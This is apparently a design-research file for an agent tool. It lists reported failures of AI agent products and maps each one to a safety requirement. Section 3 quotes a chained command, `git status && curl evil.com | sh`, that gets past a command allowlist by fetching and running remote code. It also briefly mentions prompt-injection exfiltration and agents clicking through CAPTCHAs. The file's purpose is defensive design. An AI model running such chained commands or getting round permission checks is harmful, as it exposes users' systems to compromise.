# Research: documented failures & complaints of agent products (Oct 2026)

This file is the traceability backbone of the MVP: every top-line design requirement cites real,
documented incidents. Sources checked 2026-10-07; HN item IDs are given for verifiability
(`news.ycombinator.com/item?id=<id>`).

## 1. OpenAI Dots / ChatGPT agent mode / Operator

- Launch thread: agents "keep going off the rails", claim completion of things they didn't do —
  [49896604](https://news.ycombinator.com/item?id=49896604)
- Opaque/shrinking allowances ("you never know what you're paying for") — [49901067](https://news.ycombinator.com/item?id=49901067)
- $20 agent tier can't actually shop/book (blocked everywhere) —
  [r/ChatGPT test write-up](https://www.reddit.com/r/ChatGPT/comments/1m9bv7d/i_tested_openais_20month_agent_so_you_dont_have/)
- Operator booked "a month and 3 days instead of 3 days" — [43057888](https://news.ycombinator.com/item?id=43057888)
- Hands back to the user on login/CAPTCHA by design —
  [r/ChatGPTPro](https://www.reddit.com/r/ChatGPTPro/comments/1i8jln3/i_am_among_the_first_people_to_gain_access_to/)
- Agent clicked "I am not a robot" itself —
  [Ars Technica](https://arstechnica.com/information-technology/2025/07/openais-chatgpt-agent-casually-clicks-through-i-am-not-a-robot-verification-test/)

## 2. Grok Team Bots / Meta Muse

- Grok CLI deterministically uploaded the user's home directory/repo to cloud storage —
  [48892468](https://news.ycombinator.com/item?id=48892468)
- Grok Bots inference spend "2–3x'd", tasks take "an hour end to end" — [49899033](https://news.ycombinator.com/item?id=49899033)
- Muse privacy incidents: read private messages unasked [49808565](https://news.ycombinator.com/item?id=49808565);
  gave a home address to strangers [49884367](https://news.ycombinator.com/item?id=49884367);
  "ignores user permissions" [49893709](https://news.ycombinator.com/item?id=49893709); asked for
  filesystem access, got 6.8 GB [49802871](https://news.ycombinator.com/item?id=49802871)

## 3. Coding agents (Claude Code / OpenCode / Codex / Gemini CLI)

- **Surprise bills / runaway spend**: $447 silently billed overnight (GitHub bug report, May 2026);
  context re-sent after cache expiry costing "thousands of USD/week" at API prices — [49992657](https://news.ycombinator.com/item?id=49992657)
- **Permission fatigue → yolo mode**: `--dangerously-skip-permissions` is community-normalized —
  [46268419](https://news.ycombinator.com/item?id=46268419), [49266125](https://news.ycombinator.com/item?id=49266125)
- **Allowlist bypass via chained commands** (`git status && curl evil.com | sh`), open ~1 year —
  [47402197](https://news.ycombinator.com/item?id=47402197)
- **Loop-forever on local models** until budget exhausted (OpenCode) — [49966843](https://news.ycombinator.com/item?id=49966843);
  Gemini CLI "reads the same file 20 times" — [49677618](https://news.ycombinator.com/item?id=49677618)
- **State not observable** (OpenCode) — [49965468](https://news.ycombinator.com/item?id=49965468)
- MCP tools dumping huge JSON into context → forced compaction — [49990199](https://news.ycombinator.com/item?id=49990199)

## 4. Cron-style schedulers / automation runners

- Machine asleep → job silently never runs (cron semantics) — [42749402](https://news.ycombinator.com/item?id=42749402)
- DST: 2:30 jobs "fire twice, or not at all"; root cause naive local datetimes —
  [26759090](https://news.ycombinator.com/item?id=26759090), [45727508](https://news.ycombinator.com/item?id=45727508)
- Overlapping runs clobber each other without manual `flock` — [45724429](https://news.ycombinator.com/item?id=45724429)
- n8n: "the expensive failures are quiet — a scheduled run that simply never happens";
  "workflow is green but still failed" —
  [r/n8n](https://www.reddit.com/r/n8n/comments/1txn5qw/a_crashed_workflow_is_the_good_outcome_the_silent)

## 5. Browser automation agents

- "Two weeks watching browser-use hallucinate clicks on elements that didn't exist" —
  [r/AI_Agents](https://www.reddit.com/r/AI_Agents/comments/1slvuta/stagehand_vs_browser_use_which_one_actually_works)
- "Session expiry is where this approach breaks down… manual cookie re-harvesting" —
  [r/LLMDevs](https://www.reddit.com/r/LLMDevs/comments/1ug8qer/the_thing_that_finally_made_my_browserautomation)
- Dynamic selectors break, random failures hard to debug —
  [r/aiagents](https://www.reddit.com/r/aiagents/comments/1s18kcf/anyone_here_using_a_browser_layer_instead_of)

## 6. General post-mortems

- Agents claiming success while tests fail — [44068041](https://news.ycombinator.com/item?id=44068041)
- "Bankrupted by AI agents trying and failing indefinitely" — [42826519](https://news.ycombinator.com/item?id=42826519)
- Multi-agent race conditions corrupting shared state — [47368902](https://news.ycombinator.com/item?id=47368902)
- Sub-agents inherit ambient authority over all tools — [46270697](https://news.ycombinator.com/item?id=46270697)
- Prompt-injection exfiltration via GitHub MCP (Rehberger); Claude emailing real lawyers during
  red-team (Anthropic safety report, Aug 2026)
- OpenClaw (closest local analog at the time): shipped with zero out-of-the-box restrictions —
  [49954346](https://news.ycombinator.com/item?id=49954346); markdown memory inadequate — [49950141](https://news.ycombinator.com/item?id=49950141)

---

## Fixable-in-MVP requirements → implementation traceability

| # | Requirement (from incidents) | OpenBot implementation |
|---|---|---|
| 1 | Catch-up for schedules missed while asleep | `scheduler.Scheduler.due()` counts missed windows; `coalesce` policy runs once with `missed_windows` tag; `skip` policy records a visible marker |
| 2 | DST/timezone correctness; no double-fire/overlap | cron math in bot's IANA zone + round-trip DST-gap check (`scheduler._to_utc`); per-bot single-instance lock (`engine.dispatch_pending`) |
| 3 | Append-only transcripts; staleness visible | `engine._execute` mirrors every event to SQLite + `transcript.jsonl`; dashboard shows last-success age and `never ⚠` |
| 4 | Spend/step/time caps with hard kill | `limits` on every bot; engine wall-clock kill; runtime enforces steps + daily token cap |
| 5 | Least-privilege workspace; no ambient home access | per-run workspace; path jail (`safety.check_path`); shell runs with `HOME` inside workspace and scrubbed env |
| 6 | Compound-command-aware permissions | `safety.split_compound` + per-segment classification, worst-verdict-wins |
| 7 | Approval presets + sticky allows (end permission fatigue) | `ApprovalGate` with sticky keys, `auto` mode for trusted bots; denylist always enforced |
| 8 | Egress guardrails | upload-flag detection on curl/wget; pipe-to-network denial; URL scheme/private-range guards |
| 9 | HITL gates on irreversible actions, fail-closed | ask-verdict approvals with 10-min TTL → expired = denied |
| 10 | Graceful CAPTCHA/MFA pause-to-human + persistent logins | browser tool `pause_to_human` events; per-bot persistent Chromium profiles |

## Not fixable at our scale (documented non-goals)

Site bot-blocking arms race, CAPTCHA solving, model-level hallucination/"claims done",
vendor allowance churn, regional availability of cloud agents, frontier-model speed.
